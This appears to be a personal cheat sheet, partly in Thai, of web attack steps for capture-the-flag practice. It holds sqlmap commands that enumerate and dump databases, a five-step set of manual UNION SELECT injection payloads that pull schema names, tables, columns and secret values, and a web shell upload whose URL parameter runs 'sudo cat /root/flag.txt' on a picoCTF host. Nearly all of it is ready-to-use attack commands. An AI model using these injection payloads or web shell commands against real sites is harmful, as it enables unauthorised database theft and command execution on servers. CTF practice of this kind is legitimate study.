#web 
# Database
## Knowlage
DB => tables => columns => data
# SQL Map
[[SQLMap]]
## Normal
### Command
```bash
sqlmap -u http://IP/prd.php?id=34 --dbs
sqlmap -u http://IP/prd.php?id=34 -D goku --tables
sqlmap -u http://IP/prd.php?id=34 -D goku -T tbl_type --dump
```
## Advance
### Command
หา request จาก Burpsuit copy save txt sql.txt
```bash
sqlmap -r sql.txt --dbs -p id
sqlmap -r sql.txt -p id -D goko --tables
```
ทำเหมือน Normal
# Union
## Step
1. หาว่ามีกี่ column
```
http://example.com/index.php?id=1' ORDER BY 1-- -
```
2. ดึง database ออกมา 1,3,4 เป็น dummy ให้ครบตามจำนวน column
```
http://example.com/index.php?id=1' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -
```
3. ดึง table ออกมา
```
http://example.com/index.php?id=1' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema = 'flag'-- -
```
4. ดึง column ออกมา
```
http://example.com/index.php?id=1' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name = 'secret_table'-- -
```
5. ดึง ข้อมูล ออกมา
```
http://example.com/index.php?id=1' UNION SELECT 1,secretID,secret_value,4 FROM flag.secret_table-- -
```
# File
## Shell.php
1. upload shell.php
![[shell.php]]
2. พิมคำสั่งใน url
```
http://standard-pizzas.picoctf.net:60722/uploads/shell.php?cmd=sudo cat /root/flag.txt
```